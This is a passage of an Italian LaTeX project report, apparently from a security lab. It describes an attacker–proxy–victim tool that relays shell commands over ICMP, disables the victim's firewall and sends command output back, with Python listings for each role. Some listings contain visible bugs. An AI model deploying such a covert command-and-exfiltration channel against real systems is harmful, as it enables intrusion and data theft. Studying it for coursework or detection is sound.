\subsection{Struttra delle entità}
\begin{minipage}{0.5\linewidth}
    Le entita coinvolte sono:
    \begin{itemize}
        \item L'\textbf{attaccante} che deciderà l'indirizzo IP della vittima, il metodo di attacco e il comando da eseguire.
        \item Il \textbf{proxy} che si connette all'attaccante per oteenere il comando e la vittima a cui inoltrarlo. 
        \item La \textbf{vittima} che aspetta le connessioni da uno o più proxy e, una volta ricevuto, rimanda i dati ricavati dal comando eseguito.
    \end{itemize}
\end{minipage}
\hspace{2ex}
\begin{minipage}{0.5\linewidth}
    \centering
    \includegraphics[width=\linewidth]{../img/implementazione/struttura attacker.proxy.victim.jpg}
\end{minipage}
L'attaccante potrà usare uno o più proxy per comunicare con la vittima. 
Il canale di comunicazione vittima-proxy viene stabilito tramite il protocollo TCP (e non ICMP come nel caso proxy-vittima) 
Ciò è possibile siccome il proxy è controllato dall'attaccante e quindi non ha paura di essere scoperto. 
\vspace{1ex} \newline
Tuttavia se bisogna nascondersi anche dai proxy, si può stabilire una comunicazione tramite ICMP; 
sebbene questa sarà meno stabile e gestibile rispetto all'altra. 
\vspace{4ex} \newline
La comunicazione fra proxy e la vittima invece avviene tramite il protocollo ICMP: 
\begin{itemize}
    \item la vittima si mette in ascolto di proxy che si vogliono connettere. 
    \item il proxy invece invia un messaggio alla vittima per indicare la volonta di connettersi. 
\end{itemize}

\subsection{Struttura attaccante} 
Lo script dell'attaccante è strutturato in questa maniera:
\begin{itemize}
    \item Si definiscono le variabili necessarie. 
    \item Si ricavano poi tutti i proxy a cui è possibile collegarsi. 
    \item Successivamente si immette un comando e lo si manda a uno dei proxy. 
    \item Dopodichè si aspetta che i proxy inoltrino i dati relativi al comando e li si ricostruiscono. 
    \item Infine si richiede un ulteriore comando. 
    Qui si può decidere se terminare il programma o continuare. 
\end{itemize} 

\subsubsection*{Definizione delle variabili}
Le principali variabili utilizzate sono:
\begin{itemize}
    \item \textbf{file\_path}: il path per il file di configurazione iniziale [Code:\ref{script:attacker:configFile}]. 
    Al suo interno si definische l'IP della vittima, l'IP dei proxy e la tipologia di attacco
    \item \textbf{attack\_function}: definisce la tipologia del protocollo ICMP verrà usata 
    dal proxy e dalla vittima per scambiarsi i messaggi. 
    \item \textbf{ip\_vittima}: l'indirizzo IP della vittima. 
    \item \textbf{ip\_host}: l'indiirzzo IP della macchina. 
    \item \textbf{proxy\_list}: la lista dei proxy connessi all'attaccante. 
    \item \textbf{received\_data}: dizionario in cui la chiave è l'indirizzo IP del proxy mentre 
    il valore è una lista, che conterra i dati inoltrati dai proxy. 
    \item \textbf{dati\_separati}: dizionario contenente i dati finali. Ovvero i dati ricevuti da ogni proxy, riuniti in base al loro ordine. 
\end{itemize}
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={ip_vittima, proxy_list, attack_function}, emphstyle=\color{red} 
    ,literate={"}{{\texttt{\char34}}}1{"}{{\texttt{"}}}1
] 
    {
        "ip_vittima":"192.168.1.20" 
        ,"proxy_list":[
            {"vm1_attaccante":"192.168.56.101"}  
            
            ,{"vm_proxy1":"192.168.56.104"}  
            ,{"vm_proxy2":"192.168.56.105"}
            
            ,{"v6_test5_wrong":"fe80::43cc:4881:32d7::43cc"}
            ,{"test":"192.168.56.xxx"}
        ]
        ,"attack_function":"ipv4_1"
    }
\end{lstlisting}
\captionof{lstlisting}{Configuration File} 
\label{script:attacker:configFile} 
\vspace{2ex}  
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={get_args_from_parser, load_config_file, attack_type, setIP_vittima, setIP_host}, emphstyle=\color{red} 
    ,emph={[2]attack_function, ip_vittima, ip_host, proxy_list},emphstyle={[2]\color{blue}} 
    ,emph={[3]dict_values, args, config_file, proxy}, emphstyle={[3]\color{olive}}
    ,emph={[4]received_data, dati_separati},emphstyle={[4]\color{blue}} 
] 
    args=get_args_from_parser() 
    dict_values={
        "file_path":args.file_path  
    }
    config_file=load_config_file(default_file, dict_values.get("file_path")) 

    attack_function=attack_type(config_file)  
    print(f"Attacco selezionato: {attack_function}") 
    ip_vittima=setIP_vittima(config_file) 
    print(f"IP vittima valido: {type(ip_vittima) } {ip_vittima }")
    ip_host=setIP_host()
    print(f"IP host valido: {type(ip_host)} {ip_host}")
    proxy_list=set_proxy_list(config_file)  

    received_data:dict[str,list]={}
    for proxy in proxy_list:
        received_data.update({proxy.compressed:[]}) 
    dati_separati={}
\end{lstlisting}
\captionof{lstlisting}{Attacker's variables}
\label{script:attacker:variables}


\subsubsection*{Connessione con i proxy}
La connessione con i proxy avviene in questo modo:
\begin{enumerate}
    \item Si chiama una funzione [Code:\ref{script:attacker:connectedProxy}] che restituirà una lista di thread e 
    un dizionario.
    \item I thread si occuperanno di ricevere i dati mandati dalla vittima.  
    \item Il dizionario invece ha come chiavi l'indirizzo IP del proxy e come valore il socket della connessione fra il proxy stesso e l'attaccante.
    \item Alla fine, se ci sono proxy disponibili, si aspetta che i thread terminino la ricezione dei dati. 
\end{enumerate}  
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={get_connected_proxy, wait_proxy_update}, emphstyle=\color{red} 
    ,emph={[2]thread_list, dict_proxy_socket, thread},emphstyle={[2]\color{blue}} 
    ,emph={[3]proxy_list, ip_vittima, attack_function}, emphstyle={[3]\color{olive}} 
]  
    thread_list, dict_proxy_socket=get_connected_proxy(
        proxy_list, ip_vittima, wait_proxy_update, attack_function
    )  
    print(f"Connected proxy {proxy_list}") 
    if len(proxy_list)<=0:
        raise Exception(f"Nessun proxy disponibile: {len(proxy_list)}")
    for thread in thread_list.values():
        thread.join() 
    print("Thread all done")
\end{lstlisting}
\captionof{lstlisting}{Connessione ai proxy}
\label{script:attacker:connProxy}
\vspace{2ex} 
La funzione \textbf{get\_connected\_proxy} è strutturata in questo modo: 
\begin{itemize}
    \item Come argomento accetta l'IP della vttima, la funzione che aspetta i dati dai proxy, la tipologia di attacco. 
    \item Subit dopo si definisce il dizionario con i socket e la lista dei thread. 
    \item Dopodichè per ogni presente nella lista dei proxy connessi; 
    si definisce il socket e ci si connette ad esso. 
    Se nel mentre si rileva un eccezione; la connessione viene chiusa e viene tolto dalla lista [Code:\ref{script:attacker:connectedProxy} line 9]
    \item Se la connessione è andata a buon fine si manderà al proxy l'indirizzo ip della vittima e 
    l'attacco da utilizzare [Code:\ref{script:attacker:connectedProxy} line 14]. 
    \item Dopodichè si aspetta una risposta dal proxy e si controlla se conferma la connessione [Code:\ref{script:attacker:connectedProxy} line 20]. 
    \item In caso negativo si chiude la connessione e si toglie il proxy dalla lista. 
    Altrimenti, in caso positivo si aggiunge il socket al dizionario [Code:\ref{script:attacker:connectedProxy} line 26]. 
    \item Dopodiche si definisce il thread che rimarrà in ascolto dei dati, lo si aggiunge alla lista e 
    lo si fà partire [Code:\ref{script:attacker:connectedProxy} line 27].
\end{itemize}  
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={get_connected_proxy, sendall, callback_func}, emphstyle=\color{red} 
    ,emph={[2]dict_proxy_socket, thread_list, proxy, socket_proxy, data},emphstyle={[2]\color{blue}} 
    ,emph={[3]proxy_list, ip_vittima, attack_func, thread}, emphstyle={[3]\color{olive}} 
] 
def get_connected_proxy(proxy_list, ip_vittima, callback_func, attack_func): 
    dict_proxy_socket:dict[str,socket.socket]={} 
    thread_list:dict[str,threading.Thread]={} 
    for proxy in proxy_list.copy(): 
        try: 
            socket_proxy=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_proxy.connect((proxy.compressed, 4567)) 
        except Exception as e:
            print(f"Socket {proxy} get_connected_proxy: {e}")
            socket_proxy.close() 
            proxy_list.pop(proxy_list.index(proxy))
            continue 
        str_vittima=com.CONFIRM_ATTACKER+ip_vittima.compressed
        str_att_func=com.ATTACK_FUNCTION+next(iter(attack_func.items()))[0]
        data=(str_vittima+"||"+str_att_func)
        socket_proxy.sendall(data.encode())

        data=socket_proxy.recv(1024).decode()
        str_conf=(com.CONFIRM_PROXY+ip_vittima.compressed+proxy.compressed)
        print(f"Socket {proxy} Received: {data}") 
        if not data or data!=str_conf:
            print(f"Close connection for {proxy}")  
            socket_proxy.sendall(com.END_COMMUNICATION.encode())
            socket_proxy.close()
            proxy_list.pop(proxy_list.index(proxy)) 
            continue 
        dict_proxy_socket.update({proxy.compressed:socket_proxy})
        thread=threading.Thread(
            target= callback_func 
            ,args=[proxy]
        ) 
        thread_list.update({proxy.compressed:thread})
        thread.start() 
    return thread_list, dict_proxy_socket
\end{lstlisting}
\captionof{lstlisting}{Attacker get connected proxy}
\label{script:attacker:connectedProxy}


\subsubsection*{Invio del comando}
Iniziamo definendo le variabili necessarie. 
Si crea per ogni proxy connettibile il proprio evento threading.Event 
(verranno usati per indicare quando il proxy ha terminato di mandare i dati).  
Dopodichè si definisce per ogni proxy il proprio thread e la lista dove verranno memorizzate le risposte ricevute. 
Infine viene creato un evento per indicare la ricezione dei dati da parte di tutti i proxy.
\vspace{1ex} \newline
Successivamente si fanno partire tutti i thread creati e qui arriva la parte in cui si richiede in input il comando. 
\begin{itemize}
    \item Se fà parte dei casi di uscita, ad ogni proxy viene mandato un messaggio indicante la 
    terminazione del programma e tutti i socket mengono chiusi. 
\end{itemize} 
Altrimenti, se non ne fà parte, il programma continua. 
Verrà scelto il proxy al quale verra mandato il comando e 
ai restanti proxy verrà invece detto di attendere i dati dalla vittima. 
Dopo di ciò aspetto che tutti i thread, che ricevono i dati dai proxy, terminino.
\vspace{2ex} \newline
Una volta terminati tutti i thread; si avra che \textbf{received\_data} conterrà tutte le informazioni mandate dai proxy. 
Questi dati verranno riordinati (in base al loro ordine di sequenza) e memorizzati in \textbf{dati\_separati}. 
\begin{itemize}
    \item \textbf{received\_data}: è un dizionario che ha come chiave l'IP dei proxy 
    mentre come valore una lista di stringhe
    \item \textbf{dati\_separati}: è una lista di stringhe
\end{itemize} 
Questa lista di stringhe verra poi unita in una singola stringa. 
Dopo di ciò si resettano le variabili per poi richiedere di inserire un altro commando.
\vspace{2ex} 
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={create_event_update_foreach_proxy, setup_thread_foreach_address, wait_data_from_proxy}, emphstyle=\color{red} 
    ,emph={[2]event_thread_update, thread_proxy_response, thread_list, thread_lock},emphstyle={[2]\color{blue}} 
    ,emph={[3]proxy_list, data, dict_proxy_socket}, emphstyle={[3]\color{olive}} 
    ,emph={[4]event_received_data, chosen_proxy, command, socket, proxy, thread},emphstyle={[4]\color{blue}} 
    ,emph={[5]random, choice, separa_dati_byID, unisciDati, reset_variables},emphstyle={[5]\color{red}} 
    ,emph={[6]received_data, dati_separati},emphstyle={[6]\color{olive}} 
    ,emph={[7]str_data, socket_proxy},emphstyle={[7]\color{blue}}
] 
    data_lock=threading.Lock()
    event_thread_update=create_event_update_foreach_proxy(proxy_list) 
    thread_lock,thread_proxy_response,thread_list=
        com.setup_thread_foreach_address(
            proxy_list, wait_data_from_proxy
        )
    event_received_data=com.get_threading_Event()
    print("Attivo i thread per ricevere i dati") 
    for thread in thread_list.values():
        thread.start()
        
    msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
    command=input(msg) 
    while command.lower() not in com.exit_cases: 
        print(f"Il comando immesso: {command}")
        try:
            chosen_proxy=random.choice(proxy_list) 
        except Exception as e:
            print(f"send_command_to_victim: {e}") 
            continue
        print(f"Il comando {command} verra mandato al proxy {chosen_proxy}") 
        print(f"Gli altri proxy ascolteranno direttamente la vititma") 
        for proxy in proxy_list:
            if proxy!=chosen_proxy :
                socket= dict_proxy_socket.get(proxy.compressed)
                socket.sendall(com.WAIT_DATA.encode())  
        socket= dict_proxy_socket.get(chosen_proxy.compressed)
        data=(com.CONFIRM_COMMAND+command)
        socket.sendall(data.encode()) 
            
        for thread in thread_list.values(): 
            thread.join()   
        print("Separazione dati per SEQ") 
        try: 
            dati_separati=separa_dati_byID(received_data) 
        except Exception as e:
            print(f"send_command_to_victim separa: {e}") 
        print("Dati separati per Sequenza")   
        try:
            str_data=unisciDati(dati_separati)
            print(str_data)
        except Exception as e:
            print("aiuto eccezzione: ",e) 
        
        reset_variables()
        command=input(msg) 
    print("Uscita dalla shell\texit")  
    for proxy in proxy_list:
        socket_proxy=dict_proxy_socket.get(proxy.compressed)
        socket_proxy.sendall(com.END_COMMUNICATION.encode()) 
        socket_proxy.close()
\end{lstlisting}
\captionof{lstlisting}{Send command to proxy}
\label{script:attacker:sendCommand}


\subsection{Struttura proxy} 
Lo script del proxy è strutturato in questa maniera:
\begin{itemize}
    \item Si definiscono le variabili necessarie
    \item Si disabilita il firewall (per riabilitarlo alla terminazione del programma)
    \item Si stabilisce una canale di comunicazione con l'attaccante e successivamenter con la vittima 
    \item Si aspetto un comando dall'atacante e lo si inoltra alla vittima. 
    \item Mandato il comando si aspettano dalla vittima i risultati che verranno poi inoltrati all'attaccante.  
\end{itemize}

\subsubsection*{Definizione delle variabili}
Le principali variabili utilizzate sono:
\begin{itemize}
    \item \textbf{ip\_attaccante}: che indica l'indirzzo IP dell'attaccante 
    \item \textbf{ip\_host}: che indica l'indirzzo IP del host 
    \item \textbf{ip\_vittima}: che indica l'indirzzo IP della vittima. 
    Il suo valore verrà definito dall'attaccante e mandato una volta connessi ad esso.
    \item  \textbf{attack\_function}: indica la tipologia di attacco e quindi il modo in cui il proxy e 
    la vittima si scambieranno i dati. 
\end{itemize}
\vspace{2ex}  
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={get_args_from_parser, iface_src_from_IP, ip_address, get}, emphstyle=\color{red} 
    ,emph={[2]ip_attaccante, ip_host, ip_vittima, attack_function},emphstyle={[2]\color{blue}} 
    ,emph={[3]dict_values, args}, emphstyle={[3]\color{olive}}
] 
    if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
        raise ValueError("args non istanza di argparse.Namespace")
    dict_values={
        "ip_attaccante":args.ip_attaccante  
    } 
    ip_attaccante=ipaddress.ip_address(dict_values.get("ip_attaccante") )
    print(f"IP attaccante: {type(ip_attaccante)} : {ip_attaccante}")  
    _,ip_host=mymethods.iface_src_from_IP(ip_attaccante)  
    ip_host=ipaddress.ip_address(ip_host)
    print(f"IP host: {type(ip_host)} : {ip_host}")
    ip_vittima=None 
    attack_function={} 
\end{lstlisting}
\captionof{lstlisting}{Proxy's variables}
\label{script:proxy:variables}


\subsubsection*{Connessione con l'attaccante}
Per stabilire una connessione con l'attaccante si stabilisce un socket in cui il proxy rimarrà in ascolto [Code:\ref{script:proxy:setupServer}]. 
Il proxy accetterrà la connessione solo se la richiesta proviene dall'attaccante. 
\vspace{2ex} \newline 
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={socket, setup_server}, emphstyle=\color{red} 
    ,emph={[2]ip_attaccante, socket_attacker, attacker_addr, data_received},emphstyle={[2]\color{blue}} 
    ,emph={[3]s}, emphstyle={[3]\color{OliveGreen}}
] 
def setup_server(ip_attaccante):
    if not isinstance(ip_attaccante, ipaddress.IPv4Address):
        raise Exception(f"IP attaccante non istanza di IPv4Address")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print(f"Server listening: {s}")  
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        s.bind(("192.168.56.104", 4567)) 
        s.listen(1)
        socket_attacker, attacker_addr=s.accept()
        if attacker_addr[0] != ip_attaccante:
            socket_attacker.close()
        else: 
            data_received=socket_attacker.recv(1024).decode()
            if not data_received or com.CONFIRM_ATTACKER not in data_received:
                print(f"Invalid data from {attacker_addr}: {data_received}") 
                socket_attacker.close()  
                exit(0) 
    return data_received, socket_attacker
\end{lstlisting}
\captionof{lstlisting}{Setup server}
\label{script:proxy:setupServer} 
\vspace{4ex}
Una volta accettata la connesisone con l'attaccante si avrà una variabile contenente i dati ricevuti e il socket della connessione. 
Dai dati si ricaverà l'idirizzo IP della vittima oltre al metodo di attacco. 
Mentre il socket verrà usato per confermare, all'attaccante, la ricezione dei dati. 
\vspace{2ex} \newline 
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={setup_server, get_attack_function}, emphstyle=\color{red} 
    ,emph={[2]ip_vittima, attack_function, data_received, socket_attacker},emphstyle={[2]\color{blue}} 
    ,emph={[3]ip_attaccante, data, ip_host, att_fun}, emphstyle={[3]\color{OliveGreen}}
] 
    data_received, socket_attacker= setup_server(ip_attaccante) 
    data_received=data_received.split("||")
    print("Dati ricevuti: ", data_received)
    for data in data_received:
        if com.CONFIRM_ATTACKER in data:
            ip_vittima=data.replace(com.CONFIRM_ATTACKER,"")
            print(f"IP vittima: {type(ip_vittima)} : {ip_vittima}")
        elif com.ATTACK_FUNCTION in data:
            att_fun=data.replace(com.ATTACK_FUNCTION,"")
            attack_function={attacksingleton.get_attack_function(att_fun)}
            print(f"Tipologia attacco: {attack_function}") 
    data=com.CONFIRM_PROXY+ip_vittima.compressed+ip_host.compressed
    socket_attacker.sendall(data.encode()) 
    print("Socket con attaccante stabilito") 
\end{lstlisting}
\captionof{lstlisting}{Setup server}
\label{script:proxy:setupServer}


\subsubsection*{Connessione con la vittima}
La connessione con la vittima avviene in questo modo:
\begin{enumerate}
    \item Si imposta un thread che si occuperà di ricevere i dati mandati dalla vittima e lo si fà partire. 
    \item Successivamente si codifica la modalità di attacco così da poterla inserire nel campo \textit{'identifier'} del pacchetto ICMP che si manderà. 
    \item Dopodichè si invia un pacchetto tramite il protocollo ICMP alla vittima. 
    \item Successivamente si aspetta che la vittima confermi la connessione. 
    \item Fatto questo si aggiornerà l'attaccante se il proxy è connesso alla vittima. 
\end{enumerate}
\vspace{2ex} 
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={wait_conn_from_victim, setup_thread, send_packet, confirm_conn_to_victim}, emphstyle=\color{red} 
    ,emph={[2]thread, icmp_id, thread_response, thread_dict, thread_lock},emphstyle={[2]\color{blue}} 
    ,emph={[3]ip_vittima, ip_host, result, confirm_text, socket_attacker}, emphstyle={[3]\color{OliveGreen}}
] 
    thread_lock, thread_response, thread_dict=setup_thread(
        lambda: wait_conn_from_victim(ip_vittima,ip_host) 
        ,ip_host
    )
    thread=thread_dict.get(ip_host.compressed)
    thread.start()  
    
    att_fun=next(iter(attack_function.items()))[0]
    int_version, int_code= att_fun.replace("ipv","").split("_")
    XORversion= ord("i") ^ int(int_version)
    XORcode= ord("p") ^ int(int_code)
    icmp_id=(XORversion<<8)+XORcode 
    confirm_text=com.CONFIRM_PROXY+ip_vittima.compressed
    if com.send_packet(confirm_text.encode() , ip_vittima, icmp_id=icmp_id): 
        print(f"Reply: la vittima {ip_vittima} ha risposto") 
        result= True 
    else:
        print(f"No Reply: la vittima {ip_vittima} non ha risposto") 
        result= False 
    thread.join() 
    thread_lock.acquire()
    result=thread_response.get(ip_host.compressed) and result
    thread_lock.release()
    if not DEBUG:
        confirm_conn_to_victim(
            ip_vittima, ip_host, socket_attacker, result
        )
        print("Attacccante aggiornato sulla connessione con la vittima")
\end{lstlisting}
\captionof{lstlisting}{Connessione con la vittima}
\label{script:proxy:victimConnection}


\subsubsection*{Invio del comando e ricezione dei dati}
Stabilita la connessione con l'attaccante e con la vittima; 
si aspetta dal primo il comando da eseguire [Code:\ref{script:proxy:recExecCommand} line 3] 
per poi inoltrarlo alla vittima [Code:\ref{script:proxy:recExecCommand} line 15]. 
\vspace{1ex} \newline
Invece dal secondo si aspettano i dati relativi al comando [Code:\ref{script:proxy:recExecCommand} line 7] 
per poi reindirizzarli all'attacante [Code:\ref{script:proxy:recExecCommand} line 20]. 
\vspace{1ex} \newline
Dopodichè si aspetta un ulteriore comando e nel caso è quello per terminare la comunicazione; 
viene aggiornata la vittima della cosa e poi si chiude il canale di comunicazione con l'attaccante [Code:\ref{script:proxy:recExecCommand} line 30]. 
\vspace{2ex} \newline 
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={wait_command_from_attacker, send_data, sendall, wait_data_from_vicitm}, emphstyle=\color{red} 
    ,emph={[2]data_socket, data_received, thread_data, command},emphstyle={[2]\color{blue}} 
    ,emph={[3]socket_attacker, exit_cases, attack_func, ip_vittima, ip_host}, emphstyle={[3]\color{OliveGreen}}
    ,emph={[4]redirect_data_to_attacker, update_victim_end_communication}, emphstyle={[4]\color{red}}
] 
def wait_command_from_attacker(): 
    data_lock=threading.Lock()
    print("Waiting for the attacker's command")
    data_socket=socket_attacker.recv(1024).decode()  
    while data_socket and data_socket not in com.exit_cases: 
        data_received=[]  
        thread_data=threading.Thread(
            lambda: wait_data_from_vicitm(
                ip_vittima, ip_host, attack_func, data_received
            )
        )
        thread_data.start() 
        if com.CONFIRM_COMMAND in data_socket:   
            command= data_socket.replace(com.CONFIRM_COMMAND,"").strip()
            print(f"Il comando per la vittima: {command}")
            attacksingleton.send_data(attack_func, command, ip_vittima)
        elif com.WAIT_DATA in command:
            print("Non ho il comando. Dalla vittima aspetto i dati")
        else: 
            print(f"COMMAND: caso non contemplato {command}")
        if thread_data.ident is not None:
            thread_data.join()
        print(f"Thread ended. Received data: {data_received}")
        if len(data_received)<=0:
            print("Non si mandano i dati all'attaccante")
            socket_attacker.sendall(com.LAST_PACKET.encode()) 
        else:
            redirect_data_to_attacker(data_received)
        data_socket=socket_attacker.recv(1024).decode()
    print("Interruzione del programma")
    update_victim_end_communication(ip_vittima)
    socket_attacker.close()   
\end{lstlisting}
\captionof{lstlisting}{Ricezione ed esecuzione del comando}
\label{script:proxy:recExecCommand}


\subsubsection*{Invio dei risultati all'attaccante}
I dati sono stringhe memorizzate in una lista. 
Ciascuna di esse viene mandata all'ataccante tramite il socket e, una volta spedite tutte, 
si invia un ulteriore stringa che indicherà all'attaccante che tutti i dati sono stati mandati. 
\vspace{2ex} \newline 
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={sendall}, emphstyle=\color{red} 
    ,emph={[2]data, socket_attacker},emphstyle={[2]\color{blue}} 
    ,emph={[3]data_received}, emphstyle={[3]\color{OliveGreen}} 
] 
    if not com.is_list(data_received):
        raise Exception(f"Argomenti non validi: {type(data_received)}") 
    print(f"data_received: {data_received}") 
    for data in data_received:
        print("Data: ",data)   
        try: 
            socket_attacker.sendall(data.encode()) 
        except Exception as e:
            print(f"redirect_data_to_attacker: {e}")
    socket_attacker.sendall(com.LAST_PACKET.encode())
    print(f"Dati mandati all'attaccante")
\end{lstlisting}
\captionof{lstlisting}{Ricezione ed esecuzione del comando}
\label{script:proxy:recExecCommand}


\subsection{Struttura vittima} 
La struttura dello ascript della vittima è strutturato in questo modo:
\begin{enumerate}
    \item Si disabilita il firewall della vittima, così da evitare che impedisca di ricevere o mandare i dati
    \item Si definiscono le variabili necessarie. 
    \item Si aseptta la connesisone dei proxy e raggiunto il numero necessartio, si procede ad aspettare il comando dell'attaccnate. 
    \item Ricevuto il comando, lo si esegue e si mandano i risultati ai proxy connessi. 
    \item Se non viene mandato un ulteriore comando, la comunicazione viene interrotta e il firewall riabilitato. 
    Dopodichè il programma termina. 
\end{enumerate} 

\subsubsection*{Definizione delle variabili}
Le principali variabili vengono definite in questo modo:
\begin{itemize}
    \item l'\textbf{indirizzo IP della machcina} [Code:\ref{script:vittima:ip_host}]. 
    O tramite il metodo \textbf{find\_local\_IP()} (della libreria \textit{mymethods.py}) 
    oppure inserendo manualmente l'indirizzo. 
    \item gli \textbf{argomenti} passati quando si chiama lo script [Code:\ref{script:vittima:args}]. 
    Si definisce un ArgumentParser (della libreria \textit{argparse}) che ha come argomento il minimo numero di proxy da usare. 
    \item il \textbf{metodo usato per trasmettere e ricevere i dati} il cui valore verrà definto successivametente, dentro la \textit{callback\_wait\_conn\_from\_proxy} [Code:\ref{script:vittima:argsniffer}].
\end{itemize}
%-----------------------------------------------------------------
\vspace{2ex}  
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={find_local_IP}, emphstyle=\color{red}
    ,emph={[2]ip_host},emphstyle={[2]\color{blue}} 
    ,emph={[4]mymethods},emphstyle={[4]\color{red}}
] 
    ip_address, errore=mymethods.find_local_IP()
    if ip_address is not None and ipaddress.ip_address(ip_address): 
        ip_host=ipaddress.ip_address(ip_address) 
        break
    else:
        print(f"Errore nel trovare l'IP locale: {errore}")
        msg="Inserire indirizzo IP dell'host:\n\t#" 
        ip_host=ipaddress.ip_address(input(msg)) 
        break 
\end{lstlisting}
\captionof{lstlisting}{IP host}
\label{script:vittima:ip_host}

%-----------------------------------------------------------------
\vspace{2ex} 
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={args}, emphstyle=\color{red} 
    ,emph={[2]num_proxy},emphstyle={[2]\color{blue}} 
    ,emph={[4]get_args_from_parser},emphstyle={[4]\color{red}}
] 
    if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
        raise ValueError("args non istanza di argparse.Namespace") 
    dict_values={
        "num_proxy":args.num_proxy  
    }
    num_proxy=dict_values.get("num_proxy") 

    def get_args_from_parser(): 
        parser = argparse.ArgumentParser() 
        parser.add_argument("--num_proxy",type=int, help="Num proxy necessari") 
        try:
            args, unknown =mymethods.check_for_unknown_args(parser)  
            if len(unknown) > 0: 
                raise Exception(f"Argomenti sconosciuti: {unknown}") 
            if not isinstance(args.num_proxy, int):
                raise ValueError("Il numero di proxy non un intero")  
            return args
        except Exception as e:
            mymethods.print_parser_supported_arguments(parser)
            raise Exception(f"get_args_from_parser: {e}")
\end{lstlisting}
\captionof{lstlisting}{Args victim}
\label{script:vittima:args}

\subsubsection*{Connessione con i Proxy}
Il metodo che si occupa di ottenere i proxy connessi alla vittima è strutturato in questo modo: 
\begin{enumerate}
    \item Crea le variabili necessarie: 
    in questo caso la lista dei proxy connessi ed un threading Lock (siccome la lista viene usata da più thread)
    \item Dopodichè chiama il metodo che aspetterà la connesisone da parte dei proxy.
    Al suo interno verrà chiamata il cuore della procedura questo perchè si occuperà di analizzare i messaggi che 
    transitano sulla rete e catturare quelli provenienti dai proxy (che vogliono stabilire una connessione). 
    \item Terminato il monitoraggio dei pacchetti, si controlla se sono stati trovati abbastanza proxy connessi. 
    Nel caso non ne siano stati trovati abbastanza si chiede se continuare con quelli già presenti. 
    \item Se si decide di 'non continuare' si termina il programma altrimenti si continua l'esecuzione dell'attacco. 
\end{enumerate}
%Si definisce una lista contenente tutti i proxy connessi; 
%inizialmente sarà vuota e per ogni che si connetterà gli verrà aggiunto l'indirizzo IP del proxy. 
%\vspace{2ex} \newline
\vspace{2ex}  
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={wait_conn_from_proxy, ask_bool_choice}, emphstyle=\color{red} 
    ,emph={[2]connected_proxy, lock_connected_proxy, num_proxy}, emphstyle={[2]\color{blue}} 
    ,emph={[3]msg}, emphstyle={[3]\color{olive}} 
    ,literate={`}{{\texttt{\char96}}}1{"}{{\texttt{"}}}1 
] 
connected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
lock_connected_proxy=threading.Lock()  
wait_conn_from_proxy() 
print(f"Funzione di attacco ricevuta: {attack_function}")
print(f"I proxy utilzzabili sono {len(connected_proxy)}: {connected_proxy}") 
if len(connected_proxy) < num_proxy: 
    print(f"Non sono stati trovati abbastanza proxy ({connected_proxy})")
    msg="Utilizzare comunque quelli trovati? [si/no]"
    if len(connected_proxy)<=0 or not mymethods.ask_bool_choice(msg) :
        print("Interruzione del programma...")  
        mymethods.reenable_firewall()
        exit(0) 
    else: 
        print("Continuo con i proxy trovati...") 
\end{lstlisting}
\captionof{lstlisting}{Metodo per la connesisone dei proxy}
\label{script:vittima:proxyConnect}
Il metodo che monitora i pacchetti viene definito in questa maniera. 
Il metodo che aspetta la connessione da parte dei proxy è definito così:
\begin{itemize}
    \item si definisce \textbf{event\_enough\_proxy} una variabile \textit{threading.Event} per indicare se la vittima ha raggiunto il numero di proxy necessari. 
    \item si definisce l'\textbf{interfaccia} sulla quale arriveranno i pacchetti 
    \item il \textbf{filtro} utilizzato per filtrare i pacchetti [Code:\ref{script:vittima:filter} line 3]
    \item gli \textbf{argomenti per lo sniffer} così da definire come monitorare i pacchetti che arrivano [Code:\ref{script:vittima:waitConnFromProxy} line 11] 
\end{itemize} 
Dopodichè definisco la funzione che verrà eseguita quando il timer scadra; 
e inizio ad ascoltare il traffico di rete [Code:\ref{script:vittima:waitConnFromProxy} line 33]. 
Ciò mi restituirà due variabili:
\begin{itemize}
    \item lo \textbf{sniffer} e il \textbf{timer}. 
    %Alla funzione vengono passati oltre agli argomenti dello sniffer anche quelli per il timer (in particolare il suo tempo e la funzione da chiamare quando scade). 
    Le quali verranno utilizzate successivamente per fermare il monitoraggio dei pacchi. 
\end{itemize} 
Dopodichè si aspetta che l'evento, indicante il ragigungimento del numero dei proxy, venga impostato; 
